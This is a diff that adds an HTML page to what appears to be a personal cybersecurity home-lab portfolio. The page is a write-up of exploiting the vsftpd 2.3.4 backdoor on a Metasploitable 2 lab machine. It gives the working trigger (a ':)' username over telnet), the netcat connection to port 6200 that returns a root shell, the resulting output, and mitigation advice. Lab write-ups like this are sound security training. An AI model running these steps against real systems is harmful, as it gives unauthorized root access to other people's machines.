@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Exploitation writeup: vsftpd 2.3.4 backdoor vulnerability on Metasploitable 2, including reconnaissance, exploitation steps, impact assessment, and mitigation strategies.">
+    <title>Attack 01 — vsftpd 2.3.4 Backdoor | jellybeansontoasties</title>
+    <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+    <nav>
+        <ul>
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="../lab-setup.html">Lab Setup</a></li>
+            <li><a href="writeup-01.html">Writeups</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <h1>Attack 01 — vsftpd 2.3.4 Backdoor</h1>
+        <p class="tagline">Metasploitable 2 Exploitation</p>
+
+        <div class="writeup-section">
+            <h3>Objective</h3>
+            <p>Exploit the backdoor vulnerability in vsftpd 2.3.4 running on Metasploitable 2 to gain unauthorized access to the system. This vulnerability allows remote code execution through a malicious backdoor that was introduced in this specific version of the FTP server.</p>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Reconnaissance</h3>
+            <p>Initial port scanning revealed FTP service running on port 21. Version detection identified vsftpd 2.3.4, which is known to contain a backdoor. The backdoor can be triggered by sending a specific sequence during the FTP handshake process.</p>
+            <pre><code>$ nmap -sV -p 21 192.168.100.20
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4</code></pre>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Exploitation</h3>
+            <p>The backdoor is activated by sending ":)" as the username during FTP login, followed by a newline character. This triggers the backdoor which opens a listening shell on port 6200. After triggering the backdoor, connect to port 6200 to gain root shell access.</p>
+            <pre><code>$ telnet 192.168.100.20 21
+Trying 192.168.100.20...
+Connected to 192.168.100.20.
+220 (vsFTPd 2.3.4)
+USER :):)
+331 Please specify the password.
+PASS test
+530 Login incorrect.
+^]
+telnet> quit
+
+$ nc 192.168.100.20 6200
+id
+uid=0(root) gid=0(root)</code></pre>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Impact</h3>
+            <p>Successful exploitation results in immediate root-level access to the target system. This allows an attacker to:</p>
+            <ul style="margin: 1rem 0; padding-left: 2rem;">
+                <li>Access all files and directories</li>
+                <li>Modify system configuration</li>
+                <li>Install persistent backdoors</li>
+                <li>Exfiltrate sensitive data</li>
+                <li>Use the compromised system as a pivot point for further attacks</li>
+            </ul>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Mitigation</h3>
+            <p>To prevent this vulnerability:</p>
+            <ul style="margin: 1rem 0; padding-left: 2rem;">
+                <li><strong>Update vsftpd:</strong> Upgrade to version 2.3.5 or later, which removes the backdoor</li>
+                <li><strong>Network segmentation:</strong> Isolate FTP servers from critical network segments</li>
+                <li><strong>Access controls:</strong> Implement firewall rules to restrict FTP access to trusted IPs</li>
+                <li><strong>Monitoring:</strong> Set up intrusion detection to alert on suspicious FTP login attempts</li>
+                <li><strong>Regular audits:</strong> Perform security assessments to identify vulnerable services</li>
+            </ul>
+        </div>
+
+        <div style="margin-top: 3rem;">
+            <p><a href="writeup-02.html">Next: Attack 02 — SSH Brute Force →</a></p>
+            <p><a href="../index.html">← Back to Home</a></p>
+        </div>
+    </main>
+
+    <footer>
+        <p>Cybersecurity Home Lab Portfolio | Built with minimal terminal aesthetic</p>
+    </footer>
+</body>
+</html>
